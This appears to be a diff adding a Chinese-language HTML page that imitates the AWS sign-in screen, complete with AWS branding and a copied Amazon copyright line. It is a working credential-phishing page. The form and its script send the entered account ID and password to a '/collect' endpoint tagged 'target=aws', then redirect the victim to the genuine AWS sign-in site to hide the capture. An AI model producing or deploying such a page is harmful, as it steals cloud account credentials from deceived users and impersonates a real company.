@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AWS 登录</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "Amazon Ember", -apple-system, BlinkMacSystemFont, "Helvetica Neue", sans-serif; background: #f2f3f3; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .login-container { background: white; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 40px; width: 100%; max-width: 400px; }
+        .logo { text-align: center; margin-bottom: 32px; }
+        .logo svg { width: 120px; height: 30px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 6px; font-size: 13px; color: #1a1a2e; font-weight: 500; }
+        input { width: 100%; padding: 10px 12px; border: 1px solid #c4c6ca; border-radius: 4px; font-size: 15px; background: #fff; }
+        input:focus { outline: none; border-color: #232f3e; box-shadow: 0 0 0 3px rgba(35, 47, 62, 0.1); }
+        .btn { width: 100%; padding: 12px; background: #ff9900; color: #1a1a2e; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .btn:hover { background: #ec8900; }
+        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #636f7e; }
+        .footer a { color: #232f3e; text-decoration: none; margin: 0 4px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M0 0h120v30H0z" fill="#232F3E"/>
+                <text x="60" y="22" font-family="Arial, sans-serif" font-size="20" font-weight="bold" fill="#FF9900" text-anchor="middle">AWS</text>
+            </svg>
+        </div>
+        <form id="loginForm" action="/collect" method="POST">
+            <input type="hidden" name="target" value="aws">
+            <div class="form-group">
+                <label for="username">账户 ID 或别名</label>
+                <input type="text" id="username" name="username" required autocomplete="username" placeholder="请输入账户 ID">
+            </div>
+            <div class="form-group">
+                <label for="password">密码</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="请输入密码">
+            </div>
+            <button type="submit" class="btn">登录</button>
+        </form>
+        <div class="footer">
+            <a href="#">忘记密码?</a>
+            <a href="#">创建新的 AWS 账户</a>
+            <div style="margin-top: 8px;">© 2024, Amazon Web Services, Inc. 或其附属公司。保留所有权利。</div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const btn = e.target.querySelector('.btn');
+            btn.textContent = '登录中...';
+            btn.disabled = true;
+            try {
+                const resp = await fetch('/collect', { method: 'POST', body: formData });
+                if (resp.redirected) window.location.href = resp.url;
+                else window.location.href = 'https://signin.aws.amazon.com/';
+            } catch { window.location.href = 'https://signin.aws.amazon.com/'; }
+        });
+    </script>
+</body>
+</html>
